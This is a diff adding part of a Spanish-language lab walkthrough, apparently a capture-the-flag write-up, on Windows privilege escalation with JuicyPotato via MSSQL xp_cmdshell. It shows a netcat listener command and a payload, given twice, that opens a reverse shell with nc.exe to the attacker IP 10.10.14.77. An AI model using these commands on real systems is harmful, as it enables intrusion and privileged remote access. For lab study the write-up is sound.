@@ -525,3 +525,27 @@ Por lo que tenemos las direcciones de los ejecutables que necesitamos:
 C:\Tools\JuicyPotato.exe
 C:\Tools\nc.exe 
 ```
+
+Si intentamos movernos a `C:\Tools\` vemos que el contexto no es persistente entre comandos y pareciera que si luego hacemos `cd` nunca nos movimos de directorio, por lo que para confirmar que si nos movemos de directorio debemos concatenar los comandos con `&&`:
+
+<img width="1280" height="979" alt="image" src="https://github.com/user-attachments/assets/2f2fc538-428a-459d-bc7b-dce1d871ab28" />
+
+Procedemos a realizar el ataque `JuicyPotato`.
+
+En nuestra máquina atacante abrimos un puerto a la escucha mediante el siguiente comando:
+```bash
+nc -nlvp 8443
+```
+<img width="522" height="190" alt="image" src="https://github.com/user-attachments/assets/8fc942e1-4ad8-4e52-b84a-b7fdee5b14ca" />
+
+Nuestra ip atacante es: `10.10.14.77`.
+En la máquina víctima ejecutamos el payload final:
+
+```powershell
+xp_cmdshell C:\Tools\\JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\Tools\nc.exe 10.10.14.77 8443 -e cmd.exe" -t *
+```
+
+xp_cmdshell C:\Tools\JuicyPotato.exe -l 53375 -p "C:\Windows\System32\cmd.exe" -a " /c C:\\Tools\\nc.exe 10.10.14.77 8443 -e cmd.exe" -t *
+
+<img width="1874" height="570" alt="image" src="https://github.com/user-attachments/assets/41c18221-603e-4a3d-be1b-35a80424faaf" />
+
